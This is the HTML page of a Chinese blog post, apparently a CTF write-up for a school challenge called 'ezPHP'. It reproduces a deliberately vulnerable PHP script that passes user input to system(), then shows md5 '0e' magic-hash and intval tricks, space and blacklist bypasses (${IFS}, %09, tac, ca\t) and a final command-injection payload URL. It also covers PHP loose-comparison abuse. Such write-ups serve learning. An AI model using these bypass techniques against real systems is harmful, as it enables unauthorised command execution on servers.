@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="记录了md5、intval、绕过空格和黑名单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ezPHP">
+<meta property="og:url" content="http://example.com/2020/11/29/2020-11-29-ezPHP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="记录了md5、intval、绕过空格和黑名单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP3.png">
+<meta property="article:published_time" content="2020-11-29T15:38:11.000Z">
+<meta property="article:modified_time" content="2021-07-01T17:00:48.824Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP1.png">
+
+
+<link rel="canonical" href="http://example.com/2020/11/29/2020-11-29-ezPHP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2020/11/29/2020-11-29-ezPHP/","path":"2020/11/29/2020-11-29-ezPHP/","title":"ezPHP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ezPHP | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#md5"><span class="nav-number">1.</span> <span class="nav-text">md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#intval"><span class="nav-number">2.</span> <span class="nav-text">intval</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E3%80%81system%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">字符绕过、system函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#system-ls"><span class="nav-number">3.1.</span> <span class="nav-text">system (ls)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.</span> <span class="nav-text">空格绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IFS-%E5%92%8C-n"><span class="nav-number">3.2.1.</span> <span class="nav-text">${IFS}和$n</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="nav-number">3.2.2.</span> <span class="nav-text">重定向操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#09-Tab"><span class="nav-number">3.2.3.</span> <span class="nav-text">%09 Tab</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4%E4%BB%A3%E6%9B%BF"><span class="nav-number">3.3.1.</span> <span class="nav-text">其他命令代替</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%AA%E6%96%ADcat"><span class="nav-number">3.3.2.</span> <span class="nav-text">截断cat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E7%BB%88payload"><span class="nav-number">4.</span> <span class="nav-text">最终payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%AD%89%E4%BA%8E-x3D-x3D"><span class="nav-number">5.</span> <span class="nav-text">PHP的弱类型等于&#x3D;&#x3D;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2to%E6%95%B0%E5%AD%97"><span class="nav-number">5.1.</span> <span class="nav-text">字符串to数字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">5.2.</span> <span class="nav-text">布尔型比较</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/29/2020-11-29-ezPHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ezPHP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-11-29 23:38:11" itemprop="dateCreated datePublished" datetime="2020-11-29T23:38:11+08:00">2020-11-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-07-02 01:00:48" itemprop="dateModified" datetime="2021-07-02T01:00:48+08:00">2021-07-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">记录了md5、intval、绕过空格和黑名单</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>一个简单的校赛题目，卡死在了最后一步，复现一下<br>题目直接给出了代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$tag</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$tag</span>==md5(<span class="variable">$tag</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;6啊继续.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;爬爬爬&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;     &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">4040</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">4041</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK继续&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再试试很简单的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开始第二关吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;getit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$getit</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;getit&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$getit</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$getit</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;cumtctf&quot;</span>, <span class="variable">$getit</span>);</span><br><span class="line">        <span class="variable">$getit</span> = str_ireplace(<span class="string">&quot;rm&quot;</span>, <span class="string">&quot;cumtctf&quot;</span>, <span class="variable">$getit</span>);</span><br><span class="line">        <span class="variable">$getit</span> = str_ireplace(<span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cumtctf&quot;</span>, <span class="variable">$getit</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;U R THE BEST&quot;</span>;</span><br><span class="line">        system(<span class="variable">$getit</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;凉了鸭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开始第三关吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>第一部分的检测条件是<code>$tag==md5($tag)</code> ,可以用科学计数法绕过<br>一些字符串经过md5()加密后，会有<code>0exxxxxxx</code>的形式，这会被PHP认为是的科学计数法，其值为<code>0×10^xxxxxxx</code>恒等于0。所以我们找一个以<code>0e</code>开头，且md5值依然以<code>0e</code>开头的字符串<br>本题中，我们传入<code>0e215962017</code>,其md5值为<code>0e291242476940776845150308577824</code>,成功绕过</p>
+<h1 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h1><p>条件为<code>intval($num) &lt; 4040 &amp;&amp; intval($num+1) &gt; 4041</code><br>其中intval用于获取变量的整数值<br>如果intval函数的参数是一个字符串形式的科学计数法数字，那么intval会截取e之前的数字作为结果<br>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> intval(<span class="number">2e3</span>);</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;2e3&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>运行结果为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2000</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>而如果传入<code>&#39;2e3&#39;+1</code>，则字符串会被强行转化为数字然后参与运算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(&#x27;2e3&#x27;+1)=2001</span><br></pre></td></tr></table></figure>
+<p>利用此漏洞，结合题目要大于4041，我们传入<code>2e4</code>。因为变量<code>num</code>本身被定义为了字符串，所以我们不用加<code>&#39;&#39;</code></p>
+<h1 id="字符绕过、system函数"><a href="#字符绕过、system函数" class="headerlink" title="字符绕过、system函数"></a>字符绕过、system函数</h1><p>比赛时就是因为不熟悉system的用法而死在了flag面前。<br>代码可以看出，题目检测了<code>cat</code> <code>rm</code> <code>mv</code>以及空格</p>
+<h2 id="system-ls"><a href="#system-ls" class="headerlink" title="system (ls)"></a>system (ls)</h2><p>system — 执行外部程序，并且显示输出<br>ls-显示指定工作目录下之内容<br>所以传入参数<code>ls</code>查看文件名称，此时url为<code>http://219.219.61.234:37000/?num=0x32303231&amp;tag=0e215962017&amp;getit=ls</code><br>看到显示如下<br><img src="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP1.png" alt="看到所有文件名"><br>flag文件名称是<code>fFLLAaaaGgggg.php</code></p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="IFS-和-n"><a href="#IFS-和-n" class="headerlink" title="${IFS}和$n"></a>${IFS}和$n</h3><p>可以用<code>$&#123;IFS&#125;</code>代替空格<br>在Linux中，<code>$IFS</code>表示分隔符。但是<code>$IFS</code>会被当作变量的一部分，所以用<code>&#123;&#125;</code>固定变量<br>也可以用<code>$IFS$1</code>或者<code>$&#123;IFS&#125;$1</code><br><code>$1</code>-<code>$9</code>表示运行时第1到第9个参数。例如在循环<code>n=5;n&lt;8;n++</code>时，$1-$3就分别为5、6、7。<code>$0</code>表示脚本的名字<br>上面的<code>$1</code>可以替换为<code>$1</code>-<code>$9</code>中的任意一个</p>
+<h3 id="重定向操作符"><a href="#重定向操作符" class="headerlink" title="重定向操作符"></a>重定向操作符</h3><p><code>&gt;</code>将命令写入到文件<br><code>&lt;</code>从文件中读入输入<br><code>&lt;&gt;</code>上面效果的总和<br>所以在本题中，就可以用<code>&lt;</code>或<code>&lt;&gt;</code>来代替空格</p>
+<h3 id="09-Tab"><a href="#09-Tab" class="headerlink" title="%09 Tab"></a>%09 Tab</h3><p><code>%09</code>是Tab，即水平制表符，在PHP环境中可以代替空格</p>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="其他命令代替"><a href="#其他命令代替" class="headerlink" title="其他命令代替"></a>其他命令代替</h3><p>本题中要用的<code>cat</code>被加入了黑名单，但其他关键字也可以读出来<br>我用了<code>tac</code>读取，可以用以下关键字代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tac		从最后一行开始读取文件，第一行最后显示  </span><br><span class="line">head		读取前面几行  </span><br><span class="line">tail		读取后面几行</span><br><span class="line">nl		类似于cat -n 读取时输出行号</span><br></pre></td></tr></table></figure>
+<p>使用<code>tac</code>时，flag会被直接显示出来，其他几个命令flag都出现在注释里<br><img src="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP2.png" alt="tac"></p>
+<p><img src="https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/main/assets/images/ezPHP/ezPHP3.png" alt="其他命令"><br>可能是因为<code>tac</code>倒序输出把代码打乱了，年轻人不讲武德，耗子尾汁</p>
+<h3 id="截断cat"><a href="#截断cat" class="headerlink" title="截断cat"></a>截断cat</h3><p><code>ca&#39;&#39;t</code> <code>c&#39;a&#39;t</code> <code>ca$1t</code> <code>ca&quot;&quot;t</code> <code>c&quot;a&quot;t</code> <code>ca\t</code>都不会被识别<br>加入空字符对程序没有影响，$1也是空的，”a”还是a</p>
+<h1 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h1><p><code>http://219.219.61.234:37000/?num=0x32303231&amp;tag=0e215962017&amp;getit=ca\t$&#123;IFS&#125;flag.php</code><br>上文中各种绕过排列组合，随便组了一个</p>
+<h1 id="PHP的弱类型等于-x3D-x3D"><a href="#PHP的弱类型等于-x3D-x3D" class="headerlink" title="PHP的弱类型等于&#x3D;&#x3D;"></a>PHP的弱类型等于&#x3D;&#x3D;</h1><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php">PHP手册-弱类型比较</a></p>
+<h2 id="字符串to数字"><a href="#字符串to数字" class="headerlink" title="字符串to数字"></a>字符串to数字</h2><p>字符串和数字比较会统一转化为数字再比较<br>如果该字符串没有包含<code>.</code> <code>e</code> <code>E</code>，则该字符串被当作int来取值，其他所有情况下都被作为float来取值(也就是说可以读科学计数法的)。该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test=1+&quot;-1.3e3&quot;; //$test=-1299(float)</span><br><span class="line">$test=1+&#x27;-1.3e3&#x27;; //改成单引号也一样</span><br><span class="line">$test=1+&quot;admin2&quot;;//$test=1(int)</span><br></pre></td></tr></table></figure>
+<h2 id="布尔型比较"><a href="#布尔型比较" class="headerlink" title="布尔型比较"></a>布尔型比较</h2><p>布尔型参与比较会统一转化为布尔型再比较<br>只要不为0(包括<code>0</code>、<code>&quot;0&quot;</code>)或空转化为布尔型就都是true，这个过程其实是if(x)<br><code>&quot;false&quot;</code>转化结果也是true，那<code>&quot;0&quot;</code>凭什么不是呢？奇奇怪怪记住就行<br>比如在攻防世界lottery这道题中，关键代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">	if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">		$same_count++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$win_numbers是随机生成的中奖号码，$numbers是我们输入的号码，$same_count是相同个数<br>bp抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1234567&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
+<p>只要中奖号码该位不是0，结果就为真</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/11/29/2020-11-28-%E6%88%91%E7%BB%88%E4%BA%8E%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E9%A1%B5%E4%BA%86/" rel="next" title="我终于有自己的网站了">
+                  我终于有自己的网站了 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
